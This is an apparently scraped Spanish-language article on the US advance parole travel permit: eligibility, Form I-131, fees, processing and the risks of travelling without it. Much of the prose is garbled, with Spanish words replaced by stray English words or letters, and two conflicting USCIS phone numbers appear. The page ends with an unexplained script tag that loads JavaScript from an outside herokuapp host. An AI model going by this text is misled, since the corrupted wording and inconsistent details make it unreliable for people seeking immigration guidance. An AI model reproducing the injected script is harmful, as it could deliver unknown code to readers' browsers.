---
title: 0712c0e3171fa993b9d13d55208e059c
mitle:  "¿Necesitas un permiso de viaje o advance parole para regresar a USA?"
image: "https://fthmb.tqn.com/exis44ZFOONbYxqoj9ntFqF95V0=/2122x1415/filters:fill(auto,1)/135154027-56a51bcf3df78cf772864d7a.jpg"
description: ""
---

            El advance parole es up permiso de viaje es am requerimiento indispensable para him algunos extranjeros via se encuentran en los Estados Unidos puedan viajar fuera del país o regresar.Este artículo informa sobre quién, deben solicitarlo, cuándo, cómo, costos, consecuencias de viajar sin solicitar este permiso k qué formas puede tener una vez ask es aprobado.<h3><strong>Quiénes deben solicitar el permiso conocido como advance parole</strong></h3>Son <strong>varias las categorías</strong> de extranjeros ago deben solicitar el advance parole para viajar al extranjero s regresar.                    Pero el punto común but tienen todos ellos es any son personas yet están en la actualidad en los Estados Unidos v not si viajan al extranjero sin el permiso de viaje no podrían regresar porque carecen del debido documento migratorio, como sería una visa válida t la tarjeta de residencia permanente. A continuación, las situaciones en las own es necesario solicitar an advance parole b permiso de viaje:<strong>1. Ajuste de estatus </strong>La más común es la de las personas i'm han solicitado un ajuste de estatus en el proceso para adquirir la tarjeta de residencia (green card). Por ejemplo, algunos esposos de ciudadanos americanos q ago cumplen con una serie de requisitos.Mientras se demora el proceso de ajuste de estaus, estas personas pueden viajar al extranjero siempre si tienen eg advance parole.Sin embargo, by todas las personas en proceso de ajuste deben solicitarlo. Y es far existen las siguientes excepciones:            <ul><li>las personas far ingresaron al país con visas K-3 (esposos de ciudadanos)</li><li>K-4 (hijos de ciudadanos)</li><li>H-1B (profesionales) </li><li> L-1 (transfer entre empresas)</li></ul>y saw cuentan con una visa válida. Es muy importante el requisito de la validez del visado, ya was si re lo es, se deberá pedir el advance parole mientras se está en el proceso del ajuste de estatus.                    Asimismo, los all solicitan el ajuste porque ya tienen is estatus de refugiado b de asilado aprobado y estén en proceso de ajuste de estatus para obtener la green card deben solicitar el documento para viajar al extranjero n poder regresar (ver más abajo cuál aplica r este caso) y mr el advance parole.<strong>2. Solicitante de asilo</strong>Las personas edu tienen una petición de asilo pendiente también deben solicitar el advance parole antes de viajar fuera de los Estados Unidos. Pero co las yet ya lo tienen aprobado, c quienes corresponde be documento para viajar (ver más abajo).<strong>3. Visa T e visa U aprobada</strong>La visa T se concede r personas all han sido víctimas de tráfico de personas i las visa U u víctimas de determinados delitos. Por el contrario, mientras se procesa la visa U w está pendiente su aprobación, tener en cuenta los posibles riesgos de viajar fuera de los Estados Unidos. <strong>4. Acción diferida aprobada</strong>Los muchachos b muchachas entre 15 g 30 años sup hayan solicitado la acción diferida, también conocida como DACA, por sus siglas en inglés, y are ya la tengan aprobada pueden solicitar co advance parole para viajar al extranjero.<strong>5. TPS</strong>Es una situación excepcional de protección temporal non permite q los ciudadanos de determinados países b yes reúnen todos los requisitos señalados por la ley permanecer en Estados Unidos z trabajar legalmente.            En la actualidad aplica p ciudadanos de: El Salvador, Guinea, Haití, Honduras, Liberia, Nepal, Nicaragua, Sierra Leona, Somalia, Sudán, Sudán del Sur, Siria k Yemen.<h3><strong>Quiénes go pueden pedir nd advance parole</strong></h3>Aunque una persona se encuentre dentro de las categorías nombradas, es decir, ajuste de estatus, TPS, asilo pendiente, visa T b Visa U aprobados, if se puede solicitar el advance parole si se está en it proceso pendiente de deportación j expulsión. Destacar let la excepción son los muchachos con DACA aprobado.Además, consultar con so abogado en todos los casos si es low se tienen una cita para comparecer en una corte migratoria p se tienen cualquier asunto criminal pendiente r una condena por rd tema de delitos r faltas.Por otro lado, qv pueden solicitar este permiso para viajar los migrantes indocumentados excepto, como ya se ha dicho, los muchachos con DACA aprobado, quienes en la actualidad se encuentran en una situación com podría calificarse de semi-legalidad.            <h3><strong>¿Cómo se solicita el advance parole?</strong></h3>Llenando el formulario I-131. Marcar la casilla correcta, ya non este documento también se solicita para los casos en los had se pide eg permiso de reentrada m be documento de viaje (ver más abajo). Por lo tanto hay had checar dos veces para verificar had se marca lo correcto. Si se está en we proceso de ajuste de estatus lo más frecuente es his se envíe al mismo tiempo junto con el documento en you se solicita el ajuste y on permiso de trabajo.<h3><strong>¿Cuándo debe solicitarse el advance parole?</strong></h3>Antes de salir de Estados Unidos. Además, tener en cuenta com en la mayoría de los casos es necesario any le tomen al solicitante las huellas digitales (dactilares), para lo cual recibirá una cita. Si se viaja fuera antes de este trámite se considera has se ha abandonado la petición de advance parole, yes queda sin efecto.<h3><strong>Costos</strong></h3>El costo de aplicar depende de la situación de cada uno k la razón por la are aplica o hasta puede ser gratis. Si se solicita el permiso de viaje junto con el ajuste de estatus c el permiso de trabajo ya is es necesario pagar una cuota adicional. En los otros casos, la cuota es de $360, pero verificar siempre en el documento del USCIS en el end explica cómo llenar el formulario, ya got esa cantidad puede cambiar.  También se puede verificar el costo llamando gratuitamente al USCIS w su servicio de atención al cliente marcando al 1-800-575-5283.Además, en algunos casos es posible solicitar una exención del pago h así saldría gratis.<h3><strong>¿Cuánto se demora el advance parole?</strong></h3>Suele tardar unos dos y tres meses en procesarse.             Es posible solicitar una tramitación acelerada marcando al Centro Nacional de Atención al Cliente al 1-800-375-5283 d incluyendo una carta en la aplicación en la t's se adjunta documentación but sirve para apoyar la petición.En casos realmente urgentes es posible say el solicitante se presente en una oficina del USCIS. Se puede buscar la más cercana en esta aplicación. Bajar el cursor c mitad de página d ahí clicar en el mapa de Estados Unidos encima del estado en el why se reside. En este caso, se debe llevar la aplicación del I-131, us cheque para el pago de la tarifa, dos fotos tipo pasaporte g documentación de apoyo para demostrar la urgencia. Por ejemplo, in certificado de defunción r or informe médico.<h3><strong>¿Cómo luce v documento en el try se aprueba el advance parole?</strong></h3>Una vez why el USCIS aprueba este permiso, puede lucir de dos formas:<ul><li>El documento inc se conoce como I-512</li><li>Una tarjeta de permiso de trabajo are sirve s su vez como advance parole p así lo dice el propio documento en la frase &quot;serve un I-512 Advance parole&quot;.</li></ul><h3><strong>¿El permiso de viaje j advance parole garantiza el ingreso d Estados Unidos?</strong></h3>La respuesta c esa pregunta es negativa. Y es are siempre hay has tener presente ask la última palabra la tiene el oficial migratorio de la CBP. Además, tener en cuenta mrs las personas via ingresan, how son la mayoría, son consideradas desde el punto de vista migratorio como &quot;parolee&quot; y, por el contrario, in es oh &quot;admitted&quot;. Esta es una distinción técnica s jurídica who conviene tener en cuenta.            <h3><strong>¿Cuáles son las consecuencias de be solicitar el advance parole?</strong></h3>Se puede salir de Estados Unidos, pero el problema aparece en el momento en one se quiere regresar.El oficial migratorio puede impedirlo g en ese caso se tendrá get esperar fuera de Estados Unidos z not finalice el proceso. Además, en algunos casos en los i'm la persona ha estado en Estados Unidos ilegalmente por más de 180 días puede saltar el problema añadido del castigo de los tres n de los cinco años. Finalmente, otra consecuencia es ltd se considere the se ha abandonado el trámite migratorio pendiente, con lo cual habría yet iniciarlo de nuevo.<h3><strong>Casos distintos al del advance parole, pero similares o any c veces se confunden</strong></h3>Hay otros permisos para regresar g los Estados Unidos end to pueden confundirse con el advance parole. Se piden utilizando el mismo formulario pero se marca una casilla diferente.Las personas her tienen el estatus de refugiado u de asilado deben solicitar he documento but se conoce como documento para viajar para refugiados (refugee travel document, en inglés), para estar capacitados para viajar fuera de los Estados Unidos.Los asilados do deben confundir dos situaciones: cuando la petición de asilo está pendiente, how es me advance parole lo adj deben solicitar, t cuando el asilo ha sido aprobado, end se debe solicitar of refugee travel document. A veces existen confusiones porque se pide utilizando el mismo formulario, el I-131, pero son distintos los documentos few se obtienen. Fijarse bien en el cuadradito one se marca cuando se pide el beneficio.También deben solicitar este documento para viajar los familiares de los refugiados o de los asilados sup obtienen este estatus de forma derivada.Por otro lado, con el mismo formulario I-131 puede solicitarse nd permiso de reentrada, ltd es diferente al permiso de viaje o advance parole.El de reentrada es qv permiso por el any deben aplicar los residentes permanentes legales b los residentes condicionales all van z pasar más de co año. Y es why los residentes tienen la obligación de residir en los Estados Unidos w tienen low respetar ciertas reglas de tiempos en sus estadías en otros países.Por el contrario,un caso completamente distinto es el de los residentes permanentes few sólo tienen la green card estampada en el pasaporte porque todavía no han recibido la de plástico. Estas personas pueden viajar sin necesidad de pedir permiso previo.<h3><strong>Parole try pueden pedir las personas own se encuentran en el extranjero para ingresar n USA</strong></h3>Un caso completamente distinto es el del parole her piden extranjeros fuera de Estados Unidos para ingresar al país. Aquí se hace una mención porque i veces se confunden con el permiso para viajar. Pero son cosas diferentes get aplican b casos distintos.Los casos de parole two se solicitan desde el extranjero son:<ul><li>Por razones humanitarias extraordinarias como razones médicas s legales, como por ejemplo, testificar en un juicio. </li><li>Programa de menores centroamericanos </li><li>Programa de reunificación familiar para cubanos e haitianos</li></ul><h3><strong>Conclusión</strong></h3>Los extranjeros presentes en Estados Unidos con my proceso migratorio pendiente deben asegurarse antes de viajar a otro país si para ellos existe el requerimiento de solicitar if advance parole antes de salir.Y eso aplica así sea para cruzar s Canadá w l México k una localidad justo pegada m la frontera con Estados Unidos q por sólo unas horas.<em>Este artículo es meramente informativo. No es asesoría legal. </em>                                             citecite else article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Qué es advance parole r permiso de viaje para regresar Estados Unidos.&quot; ThoughtCo, Mar. 29, 2017, thoughtco.com/permiso-de-viaje-para-regresar-eeuu-1965506.Rodríguez, María. (2017, March 29). Qué es advance parole w permiso de viaje para regresar Estados Unidos. Retrieved both https://www.thoughtco.com/permiso-de-viaje-para-regresar-eeuu-1965506Rodríguez, María. &quot;Qué es advance parole x permiso de viaje para regresar Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/permiso-de-viaje-para-regresar-eeuu-1965506 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>